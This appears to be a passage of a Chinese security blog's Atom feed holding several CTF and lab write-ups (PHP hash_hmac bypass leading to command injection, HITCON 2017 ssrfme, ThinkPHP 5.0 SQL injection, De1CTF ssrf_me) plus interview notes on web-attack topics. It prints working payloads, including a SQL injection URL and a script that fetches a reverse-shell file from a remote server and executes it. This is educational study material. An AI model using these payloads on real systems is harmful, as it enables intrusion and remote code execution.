    <content type="html"><![CDATA[<h1 id="hash-hmac"><a href="#hash-hmac" class="headerlink" title="hash_hmac"></a>hash_hmac</h1><p>hash_hmac — 使用 HMAC 方法生成带有密钥的哈希值<br>hash_hmac(algo, data, key)<br>当data为数组时，结果为NULL</p><h1 id="php-code"><a href="#php-code" class="headerlink" title="php_code"></a>php_code</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file();</span><br><span class="line">if (empty($_POST[&#x27;hmac&#x27;]) || empty($_POST[&#x27;host&#x27;]))&#123;</span><br><span class="line">        header(&#x27;HTTP/1.0 400 Bad Request&#x27;);</span><br><span class="line">        exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secert = getenv(&#x27;SECRET&#x27;);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;nonce&#x27;]))</span><br><span class="line">        $secret=hash_hmac(&#x27;sha256&#x27;,$_POST[&#x27;nonce&#x27;], $secret);</span><br><span class="line"></span><br><span class="line">$hmac = hash_hmac(&#x27;sha256&#x27;,$_POST[&quot;host&quot;],$secret);</span><br><span class="line"></span><br><span class="line">if ($hmac !== $_POST[&#x27;hmac&#x27;])&#123;</span><br><span class="line">        header(&#x27;HTTP/1.0 403 Forbiden&#x27;);</span><br><span class="line">        exit;</span><br><span class="line">&#125;</span><br><span class="line">echo exec(&quot;host&quot;.$_POST[&#x27;host&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当不知道$secret的值时，将nonce为数组传入,使第一个生成的$secret为NULL,则$hmac可控，利用host参数传入<br>可在本地先生产盐值绕过比较<br><img src="https://raw.githubusercontent.com/iloveflag/images/master/hash_hmac_php_bug1.png" alt="hash_hmac_php_bug1.png"><br><img src="https://raw.githubusercontent.com/iloveflag/images/master/hash_hmac_php_bug2.png" alt="hash_hmac_php_bug2.png"></p><h1 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h1><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/hash_hmac_php_bug3.png" alt="hash_hmac_php_bug3.png"></p><h1 id="Link-and-environment"><a href="#Link-and-environment" class="headerlink" title="Link and environment"></a>Link and environment</h1><p><a href="https://www.youtube.com/watch?v=MpeaSNERwQA">From LiveOverflow</a><br><a href="https://github.com/iloveflag/CTF_Training_Warehouse/tree/master/hash_hmac_php_bug">Environment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;hash-hmac&quot;&gt;&lt;a href=&quot;#hash-hmac&quot; class=&quot;headerlink&quot; title=&quot;hash_hmac&quot;&gt;&lt;/a&gt;hash_hmac&lt;/h1&gt;&lt;p&gt;hash_hmac — 使用 HMAC 方法生成带有密钥的哈希值&lt;br&gt;hash_h</summary>
      
    
    
    
    
    <category term="ctf" scheme="https://iloveflag.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>从面试中发现未学到的知识点</title>
    <link href="https://iloveflag.github.io/2019/08/27/%E4%BB%8E%E9%9D%A2%E8%AF%95%E4%B8%AD%E5%8F%91%E7%8E%B0%E6%9C%AA%E5%AD%A6%E5%88%B0%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    <id>https://iloveflag.github.io/2019/08/27/%E4%BB%8E%E9%9D%A2%E8%AF%95%E4%B8%AD%E5%8F%91%E7%8E%B0%E6%9C%AA%E5%AD%A6%E5%88%B0%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9/</id>
    <published>2019-08-27T08:08:47.000Z</published>
    <updated>2025-02-14T14:45:19.320Z</updated>
    
    <content type="html"><![CDATA[<h1 id="注入："><a href="#注入：" class="headerlink" title="注入："></a>注入：</h1><p>select+where注入 ok<br>update 注入<br>insert 注入<br>delete 注入</p><p>orderby 注入：if语句结合updatexml regexp </p><p>布尔型注入与时间盲注，时间盲注的脚本编写<br>order by $name $name变量可控，如何注入<br>单引号waf屏蔽的绕过方式 除了宽字节注入</p><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p>包含木马和日志还有没有其他的情况，除了php伪协议：</p><p>包含图片马，包含日志文件，包含session文件：结合phpmyadmin，因为phpmyadmin每次登录时，会带上session<br>session.save_path，远程包含，<br>allow_url_fopen = On</p><p>allow_url_include = On<br>包含临时文件，php上传文件时，先会创建一个临时文件，结合竞争条件，在被删除之前包含</p><p>自包含，包含php session</p><h1 id="ssrf-探测内网的方式，该如何应用"><a href="#ssrf-探测内网的方式，该如何应用" class="headerlink" title="ssrf 探测内网的方式，该如何应用"></a>ssrf 探测内网的方式，该如何应用</h1><p>可能出现的地方：社交分享功能，在线翻译，图片加载，图片收藏，网站爬虫，从远程服务器加载资源<br>http，file，php协议来进行内网探测，文件读取，漏洞利用</p><h1 id="简述逻辑漏洞"><a href="#简述逻辑漏洞" class="headerlink" title="简述逻辑漏洞"></a>简述逻辑漏洞</h1><p>商城的漏洞，条件竞争，弱类型比较<br>文件上传解析漏洞 nginx appache windows特殊字符，还有啥<br>序列化与反序列化，除了serialize()函数class造成变量覆盖，你还知道哪些</p><h1 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h1><p>内网端口转发的方式和工具<br>网站渗透的基本思路，你是如何渗透的，简述一下</p><h1 id="简述命令执行"><a href="#简述命令执行" class="headerlink" title="简述命令执行"></a>简述命令执行</h1><p>黑盒测试的思路，讲了··执行，危险函数system，eval函数的查找</p><h1 id="简述你了解的web漏洞："><a href="#简述你了解的web漏洞：" class="headerlink" title="简述你了解的web漏洞："></a>简述你了解的web漏洞：</h1><p>sql<br>xss<br>csrf<br>文件上传<br>文件包含<br>ssrf</p><p>任意文件下载，目录穿越</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;注入：&quot;&gt;&lt;a href=&quot;#注入：&quot; class=&quot;headerlink&quot; title=&quot;注入：&quot;&gt;&lt;/a&gt;注入：&lt;/h1&gt;&lt;p&gt;select+where注入 ok&lt;br&gt;update 注入&lt;br&gt;insert 注入&lt;br&gt;delete 注入&lt;/p&gt;
&lt;p&gt;or</summary>
      
    
    
    
    
    <category term="rubbish" scheme="https://iloveflag.github.io/tags/rubbish/"/>
    
  </entry>
  
  <entry>
    <title>hitcon-ctf-2017-ssrfme</title>
    <link href="https://iloveflag.github.io/2019/08/07/hitcon-ctf-2017-ssrfme/"/>
    <id>https://iloveflag.github.io/2019/08/07/hitcon-ctf-2017-ssrfme/</id>
    <published>2019-08-07T03:16:44.000Z</published>
    <updated>2025-02-14T14:45:19.311Z</updated>
    
    <content type="html"><![CDATA[<p>某位老哥发我一道web题，搜了一下是hitconctf2017的题，话说以前在i春秋上做过HITCON2017(babyfirst-revenge)的题，质量都很好<br>dockerfile:<a href="https://github.com/Pr0phet/hitconDockerfile/tree/master/hitcon-ctf-2017/ssrfme">https://github.com/Pr0phet/hitconDockerfile/tree/master/hitcon-ctf-2017/ssrfme</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&quot;sandbox/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]); </span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>); </span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>); </span><br><span class="line"></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;GET &quot;</span> . <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>])); </span><br><span class="line">    <span class="variable">$info</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_GET</span>[<span class="string">&quot;filename&quot;</span>]); </span><br><span class="line">    <span class="variable">$dir</span>  = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">basename</span>(<span class="variable">$info</span>[<span class="string">&quot;dirname&quot;</span>])); </span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>); </span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$dir</span>); </span><br><span class="line">    @<span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$info</span>[<span class="string">&quot;basename&quot;</span>]), <span class="variable">$data</span>); </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><br>php中shell_exec执行GET命令，而GET命令是通过perl执行的<br>perl在open当中可以执行命令，如:<br>open(FD, “ls|”)或open(FD, “|ls”)<br>前提是文件需要存在</p><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/hitcon-ctf-2017-ssrfme.png" alt="hitcon-ctf-2017-ssrfme"></p><p>先在服务器上写上反弹shell命令，1.靶机请求页面写入文件当作脚本，2.创建bash命令文件，3.perl漏洞执行反弹获取shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://1.1.1.1/&#x27;</span></span><br><span class="line">shell_url = <span class="string">&#x27;http://0.0.0.0/shell.txt&#x27;</span></span><br><span class="line">r=requests.get(url+<span class="string">&#x27;?url=&#x27;</span>+shell_url+<span class="string">&#x27;&amp;filename=a&#x27;</span>)</span><br><span class="line">r=requests.get(url+<span class="string">&#x27;?url=&amp;filename=bash a|&#x27;</span>)</span><br><span class="line">r=requests.get(url+<span class="string">&#x27;?url=file:bash a|&amp;filename=xxx&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>参考：</p><p><a href="https://lorexxar.cn/2017/11/10/hitcon2017-writeup/#ssrfme">https://lorexxar.cn/2017/11/10/hitcon2017-writeup/#ssrfme</a></p><p><a href="https://blog.o1hy.com/30/GET命令漏洞/">https://blog.o1hy.com/30/GET%E5%91%BD%E4%BB%A4%E6%BC%8F%E6%B4%9E/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;某位老哥发我一道web题，搜了一下是hitconctf2017的题，话说以前在i春秋上做过HITCON2017(babyfirst-revenge)的题，质量都很好&lt;br&gt;dockerfile:&lt;a href=&quot;https://github.com/Pr0phet/hitc</summary>
      
    
    
    
    
    <category term="ctf" scheme="https://iloveflag.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>thinkphp5.0_sql_injection分析</title>
    <link href="https://iloveflag.github.io/2019/08/04/thinkphp5-0-sql-injection%E5%88%86%E6%9E%90/"/>
    <id>https://iloveflag.github.io/2019/08/04/thinkphp5-0-sql-injection%E5%88%86%E6%9E%90/</id>
    <published>2019-08-04T01:40:42.000Z</published>
    <updated>2025-02-14T14:45:19.319Z</updated>
    
    <content type="html"><![CDATA[<h1 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h1><p><a href="http://127.0.0.1/thinkphp5.0.15/public/index.php/index/index/index?password[0]=inc&amp;password[1]=updatexml(1,concat(0x7e,version()),1)&amp;password[2]=1">http://127.0.0.1/thinkphp5.0.15/public/index.php/index/index/index?password[0]=inc&amp;password[1]=updatexml(1,concat(0x7e,version()),1)&amp;password[2]=1</a></p><h1 id="source"><a href="#source" class="headerlink" title="source:"></a>source:</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//index.php</span><br><span class="line">&lt;?php</span><br><span class="line">namespace app\index\controller;</span><br><span class="line">use think\Db;</span><br><span class="line">class Index</span><br><span class="line">&#123;</span><br><span class="line">    public function index()</span><br><span class="line">    &#123;</span><br><span class="line">        $password = input(&quot;get.password/a&quot;);</span><br><span class="line">        Db::table(&quot;user&quot;)-&gt;where([&quot;id&quot;=&gt;1])-&gt;insert([&quot;password&quot;=&gt;$password]);</span><br><span class="line">        return &quot;ThinkPHP SQL Test.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">\\thinkphp.sql</span><br><span class="line"># Host: localhost  (Version: 5.5.53)</span><br><span class="line"># Date: 2019-07-15 10:10:05</span><br><span class="line"># Generator: MySQL-Front 5.3  (Build 4.234)</span><br><span class="line"></span><br><span class="line">/*!40101 SET NAMES utf8 */;</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># Structure for table &quot;user&quot;</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">DROP TABLE IF EXISTS `user`;</span><br><span class="line">CREATE TABLE `user` (</span><br><span class="line">  `id` int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `username` varchar(50) DEFAULT NULL,</span><br><span class="line">  `password` varchar(50) DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (`id`)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8;</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># Data for table &quot;user&quot;</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">INSERT INTO `user` VALUES (1,&#x27;test&#x27;,&#x27;password&#x27;);</span><br></pre></td></tr></table></figure><p>get请求获取password，并且强制转换为数组类型</p><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/Thinkphp_sqlinjection1.png" alt="Thinkphp_sqlinjection1"></p><h1 id="为什么password传入的是数组，且需要三个元素？"><a href="#为什么password传入的是数组，且需要三个元素？" class="headerlink" title="为什么password传入的是数组，且需要三个元素？"></a>为什么password传入的是数组，且需要三个元素？</h1><p>第一个元素为inc，第二个为核心payload，第三个为必须？</p><p>xdebug调试：</p><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/Thinkphp_sqlinjection2.png" alt="Thinkphp_sqlinjection2"></p><p>在Builder.php中，有一个switch，case的判断</p><p>判断数组的第一个元素为inc，进入case ‘inc’语句，利用parseKey函数转化第二个元素，floatval函数将第三个元素转化为返回变量 var 的 float 数值</p><p>可以看到变量$result[‘item’]返回的是updatexml(1,concat(0x7e,version()),1)+1</p><p>sql语句为:</p><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/Thinkphp_sqlinjection3.png" alt="Thinkphp_sqlinjection3"></p><p>所以说第三个元素是必须的，但是数值大小没有关系</p><h1 id="漏洞为什么会触发？"><a href="#漏洞为什么会触发？" class="headerlink" title="漏洞为什么会触发？"></a>漏洞为什么会触发？</h1><p>可以看到第二个元素为核心payload，经过parseKey函数return回来的</p><p>观察parseKey函数</p><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/Thinkphp_sqlinjection4.png" alt="Thinkphp_sqlinjection4"></p><p>函数并未对传入的<code>$key</code>进行更多的过滤与检查，导致sql注入</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;payload&quot;&gt;&lt;a href=&quot;#payload&quot; class=&quot;headerlink&quot; title=&quot;payload:&quot;&gt;&lt;/a&gt;payload:&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;http://127.0.0.1/thinkphp5.0.15/public/</summary>
      
    
    
    
    
    <category term="ctf" scheme="https://iloveflag.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>de1tactf2019_ssrf_me</title>
    <link href="https://iloveflag.github.io/2019/08/04/de1tactf2019_ssrf_me/"/>
    <id>https://iloveflag.github.io/2019/08/04/de1tactf2019_ssrf_me/</id>
    <published>2019-08-04T01:23:17.000Z</published>
    <updated>2025-02-14T14:45:19.309Z</updated>
    
    <content type="html"><![CDATA[<h1 id="de1tactf2019-ssrf-me"><a href="#de1tactf2019-ssrf-me" class="headerlink" title="de1tactf2019_ssrf_me"></a>de1tactf2019_ssrf_me</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span><br><span class="line">        <span class="variable language_">self</span>.action = action</span><br><span class="line">        <span class="variable language_">self</span>.param = param</span><br><span class="line">        <span class="variable language_">self</span>.sign = sign</span><br><span class="line">        <span class="variable language_">self</span>.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(<span class="variable language_">self</span>.sandbox)):  <span class="comment"># SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(<span class="variable language_">self</span>.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">self</span>.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> <span class="variable language_">self</span>.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % <span class="variable language_">self</span>.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(<span class="variable language_">self</span>.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> <span class="variable language_">self</span>.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % <span class="variable language_">self</span>.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">checkSign</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> (getSign(<span class="variable language_">self</span>.action, <span class="variable language_">self</span>.param) == <span class="variable language_">self</span>.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">param</span>):</span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">param</span>):</span><br><span class="line">    check = param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>访问/De1ta页面，challenge函数通过cookie获取action，sign，get请求获取param，ip自动获取，将4个参数传入Task类，跟踪到Task类的Exec函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">self</span>):</span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">self</span>.checkSign()):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> <span class="variable language_">self</span>.action:</span><br><span class="line">            tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % <span class="variable language_">self</span>.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">            resp = scan(<span class="variable language_">self</span>.param)</span><br><span class="line">            <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                result[<span 